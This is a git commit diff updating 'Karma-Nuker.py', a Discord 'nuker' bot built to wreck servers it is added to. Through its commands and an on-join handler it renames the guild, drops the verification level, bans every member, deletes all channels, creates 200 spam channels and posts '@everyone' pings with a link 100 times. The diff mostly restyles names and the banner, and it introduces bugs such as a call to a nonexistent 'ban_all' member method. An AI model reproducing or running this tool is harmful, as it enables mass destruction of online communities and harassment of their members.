d52428a7c6f2d26bd03f4d9cc5db70d29b9fd4bd
opsec <141151895+opsecs@users.noreply.github.com>
2023-09-22 18:08:45 -0700

    Update Karma-Nuker.py

--- Karma-Nuker.py
+++ Karma-Nuker.py
@@ -4,19 +4,20 @@ from discord.ext import commands
 from colorama import Fore
 import json
 import time
+import json
 
 with open("config.json", "r") as f:
     f = json.load(f)
 
-
-token = f.get("bot-token")
 nuke_on_join = f.get("nuke_on_join")
 guild_name = f.get("guild_name")
-ban = f.get("ban")
+ban_all = f.get("ban")
 channel_name = f.get("channel_name")
 channel_name2 = f.get("channel_name2")
 text = f.get("text")
+text2 = f.get("text2")
 reason = f.get("audit_log_reason")
+token = f.get("bot-token")
 
 init()
 
@@ -25,11 +26,11 @@ client = commands.Bot(command_prefix="$", intents=intents)
 client.remove_command('help')
 
 
-class COLORS:
-    r = Fore.LIGHTRED_EX
-    g = Fore.LIGHTGREEN_EX
+class COLOR:
+    r = Fore.RED
+    g = Fore.GREEN
     lb = Fore.LIGHTBLUE_EX
-    m = Fore.LIGHTMAGENTA_EX
+    m = Fore.MAGENTA
     lc = Fore.LIGHTCYAN_EX
     c = Fore.CYAN
     y = Fore.LIGHTYELLOW_EX
@@ -40,47 +41,54 @@ class COLORS:
 @client.event
 async def on_ready():
     print(f'''
+      
+{COLOR.m}        ##    ##    ###    ########  ##     ##    ###       ##    ## ##     ## ##    ## ######## ########  
+{COLOR.b}        ##   ##    ## ##   ##     ## ###   ###   ## ##      ###   ## ##     ## ##   ##  ##       ##     ## 
+{COLOR.m}        ##  ##    ##   ##  ##     ## #### ####  ##   ##     ####  ## ##     ## ##  ##   ##       ##     ## 
+{COLOR.b}        #####    ##     ## ########  ## ### ## ##     ##    ## ## ## ##     ## #####    ######   ########  
+{COLOR.m}        ##  ##   ######### ##   ##   ##     ## #########    ##  #### ##     ## ##  ##   ##       ##   ##   
+{COLOR.b}        ##   ##  ##     ## ##    ##  ##     ## ##     ##    ##   ### ##     ## ##   ##  ##       ##    ## 
+{COLOR.m}        ##    ## ##     ## ##     ## ##     ## ##     ##    ##    ##  #######  ##    ## ######## ##     ##            
+                                              
 
-{COLORS.b}        
-{COLORS.m}        ##    ##    ###    ########  ##     ##    ###       ##    ## ##     ## ##    ## ######## ########  
-{COLORS.b}        ##   ##    ## ##   ##     ## ###   ###   ## ##      ###   ## ##     ## ##   ##  ##       ##     ## 
-{COLORS.m}        ##  ##    ##   ##  ##     ## #### ####  ##   ##     ####  ## ##     ## ##  ##   ##       ##     ## 
-{COLORS.b}        #####    ##     ## ########  ## ### ## ##     ##    ## ## ## ##     ## #####    ######   ########  
-{COLORS.m}        ##  ##   ######### ##   ##   ##     ## #########    ##  #### ##     ## ##  ##   ##       ##   ##   
-{COLORS.b}        ##   ##  ##     ## ##    ##  ##     ## ##     ##    ##   ### ##     ## ##   ##  ##       ##    ## 
-{COLORS.m}        ##    ## ##     ## ##     ## ##     ## ##     ##    ##    ##  #######  ##    ## ######## ##     ##                                                                                                                                                                                                
-{COLORS.b}       
-                                            {COLORS.m}By: @opsec | https://github.com/opsecs                            
-                                            {COLORS.b}Prefix: {client.command_prefix}                                                           
-                                            {COLORS.m}Bot Name: {client.user} {Fore.RESET}''')                                                                                                                    
+{COLOR.b}                                                Coded with love by @opsec
+{COLOR.m}                                                GitHub.com/opsecs
+{COLOR.m}                                                Prefix: {client.command_prefix}    
+{COLOR.b}                                                Bot: {client.user}  
+ ''')                                                                                                                    
     time.sleep(0.3)                                                                                                   
     print(f'''                                                                                                         
-        {COLORS.m}SETTINGS:
-        {COLORS.b}[NUKE ON JOIN] - {COLORS.m}{nuke_on_join}
-        {COLORS.b}[GUILD NAME] - {COLORS.m}{guild_name}
-        {COLORS.b}[BAN ALL] - {COLORS.m}{ban}
-        {COLORS.b}[CHANNEL NAME] - {COLORS.m}{channel_name}
-        {COLORS.b}[SECOND CHANNEL NAME] - {COLORS.m}{channel_name2}    
-        {COLORS.b}[TEXT] - {COLORS.m}{text}
-        {COLORS.b}[REASON] - {COLORS.m}{reason}
-    
-
-        {COLORS.m}Type {client.command_prefix}help for help.
+       {COLOR.m}SETTINGS:
+       {COLOR.b}[NUKE ON JOIN] - {COLOR.m}{nuke_on_join}
+       {COLOR.b}[REASON] - {COLOR.m}{reason}
+       {COLOR.b}[GUILD NAME] - {COLOR.m}{guild_name}
+       {COLOR.b}[BAN ALL] - {COLOR.m}{ban_all}
+       {COLOR.b}[CHANNEL NAME] - {COLOR.m}{channel_name}
+       {COLOR.b}[SECOND CHANNEL NAME] - {COLOR.m}{channel_name2}    
+       {COLOR.b}[TEXT] - {COLOR.m}{text}
     ''')
-    input1 = input(f"       {COLORS.b}Press{COLORS.m} enter {Fore.RESET}{COLORS.b}to{COLORS.m} continue: ")
+    input1 = input(f"       {COLOR.b}Press{COLOR.m} enter {Fore.RESET}{COLOR.b}to{COLOR.m} continue: ")
     if input1 == "":
-        import pandas as pd
-        df=pd.DataFrame([f'https://discord.com/oauth2/authorize?client_id={client.user.id}&permissions=8&scope=bot'])
-        df.to_clipboard(index=True, header=True)
-        print(f"        {COLORS.g}Succes!{COLORS.w}")
+        print(f"        {COLOR.g}Succes! Write {client.command_prefix}help in server to display help commands in this console. {COLOR.w}")
     else:
         pass
 
 
+
+BLUE = "\033[94m"
+LIGHT_MAGENTA = "\033[95m"
+RESET = "\033[0m"
+
 @client.command()
 async def help(ctx):
     await ctx.message.delete()
-    print("\nCommands:\nNuke - nukes the server\nspam [channel] - Spams @everyone ping 100 times\nban - Bans everyone in the server\ndelete - Deletes every channel\nmembers - Displays member count\n")
+    
+    print("\nCommands:\n"
+    f"{BLUE}{client.command_prefix}nuke{RESET}{LIGHT_MAGENTA} - nukes the server{RESET}\n"
+    f"{LIGHT_MAGENTA}{client.command_prefix}spam [channel]{RESET}{BLUE} - Spams @everyone ping 100 times{RESET}\n"
+    f"{BLUE}{client.command_prefix}ban_all{RESET}{LIGHT_MAGENTA} - Bans everyone in the server{RESET}\n"
+    f"{LIGHT_MAGENTA}{client.command_prefix}delete{RESET}{BLUE} - Deletes every channel{RESET}\n"
+    f"{BLUE}{client.command_prefix}members{RESET}{LIGHT_MAGENTA} - Displays members count{RESET}\n")
 
 @client.event
 async def on_guild_join(guild):
@@ -90,34 +98,36 @@ async def on_guild_join(guild):
         except:
             pass
         if guild.name == guild_name:
-            print(f"{COLORS.g}[!] Edited Guild Name")
+            print(f"{COLOR.g}[!] Successfully Edited The Guild Name To {guild_name}")
         if discord.VerificationLevel.none:
-            print(f"{COLORS.g}[!] Edited Verification Level to NONE\n")
-        if ban_all == "yes" or ban == "Yes":
+            print(f"{COLOR.g}[!] Edited Verification Level To NONE\n")
+        if ban_all == "yes" or ban_all == "Yes":
             for members in guild.members:
                 try:
-                        await members.ban(reason=reason)
-                        print(f"{COLORS.r}[!] Banned {members}")
+                        await members.ban_all(reason=reason)
+                        print(f"{COLOR.r}[!] Banned {members}")
                 except:
                     pass
         for channel in guild.channels:
             try:
                 await channel.delete()
-                print(f"{COLORS.m}[!] Deleted channel #{channel}")
+                print(f"{COLOR.m}[!] Succesfully Deleted channel #{channel}")
             except:
                 pass
         for i in range(200):
             try:
                 await guild.create_text_channel(name=channel_name, reason=reason)
             except:
-                print(f"{COLORS.r}[!] Could not create channel.{Fore.RESET}")
+                print(f"{COLOR.r}[!] Could not create channel.{Fore.RESET}")
             if channel_name2 != '':
                 try:
                     await guild.create_text_channel(name=channel_name2, reason=reason)
                 except:
-                    print(f"{COLORS.r}[!] Could not create second channel.{Fore.RESET}")
+                    print(f"{COLOR.r}[!] Could not create second channel.{Fore.RESET}")
+
 
         
+
 
 
 @client.command()
@@ -128,34 +138,33 @@ async def nuke(ctx):
     except:
             pass
     if ctx.guild.name == guild_name:
-            print(f"{COLORS.g}[!] Edited Guild Name")
+            print(f"{COLOR.g}[!] Successfully Edited Guild Name To {guild_name}")
     if discord.VerificationLevel.none:
-            print(f"{COLORS.g}[!] Edited Verification Level to NONE\n")
-    if ban_all == "true" or ban == "true":
+            print(f"{COLOR.g}[!] Edited Verification Level to NONE\n")
+    if ban_all == "true" or ban_all == "true":
             for members in ctx.guild.members:
                 try:
                         await members.ban(reason=reason)
-                        print(f"{COLORS.r}[!] Banned {members}")
+                        print(f"{COLOR.r}[!] Banned {members}")
                 except:
                     pass
     for channel in ctx.guild.channels:
             try:
                 await channel.delete()
-                print(f"{COLORS.m}[!] Deleted channel #{channel}")
+                print(f"{COLOR.m}[!] Deleted channel #{channel}")
             except:
                 pass
     for i in range(200):
             try:
                 await ctx.guild.create_text_channel(name=channel_name, reason=reason)
             except:
-                print(f"{COLORS.r}[!] Could not create channel.{Fore.RESET}")
+                print(f"{COLOR.r}[!] Could not create channel.{Fore.RESET}")
             if channel_name2 != '':
                 try:
                     await ctx.guild.create_text_channel(name=channel_name2, reason=reason)
                 except:
-                    print(f"{COLORS.r}[!] Could not create second channel.{Fore.RESET}")
-
-
+                    print(f"{COLOR.r}[!] Could not create second channel.{Fore.RESET}")
+                         
 @client.event
 async def on_guild_channel_create(channel):
     for i in range(100):
@@ -167,17 +176,18 @@ async def spam(ctx, channel: discord.TextChannel = None):
     if channel is None:
         channel = ctx.channel
     for i in range(100):
-        await channel.send("@everyone https://guns.lol/SSL")
+        await channel.send("@everyone https://guns.lol/opsec")
 
 
 @client.command(aliases=['ba'])
-async def ban(ctx):
+async def ban_all(ctx):
     await ctx.message.delete()
     for members in ctx.guild.members:
             try:
                     await members.ban(reason=reason)
-                    print(f"{COLORS.r}[!] Banned {members}")
+                    print(f"{COLOR.r}[!] Banned {members}")
             except:
+                print(f"{COLOR.r}[!] Couldn't ban {members} {Fore.RESET}")
                 pass
 
 
@@ -187,7 +197,7 @@ async def delete(ctx):
     for channel in ctx.guild.channels:
         try:
             await channel.delete()
-            print(f"{COLORS.g}[!] Deleted channel #{channel}")
+            print(f"{COLOR.g}[!] Sucessfully Deleted channel #{channel}")
         except:
             pass
 
@@ -195,6 +205,5 @@ async def delete(ctx):
 @client.command()
 async def members(ctx):
     await ctx.message.delete()
-    await ctx.send(f"member amount: {ctx.guild.member_count}")
-
+    await ctx.send(f"members amount: {ctx.guild.member_count}")
 client.run(token)
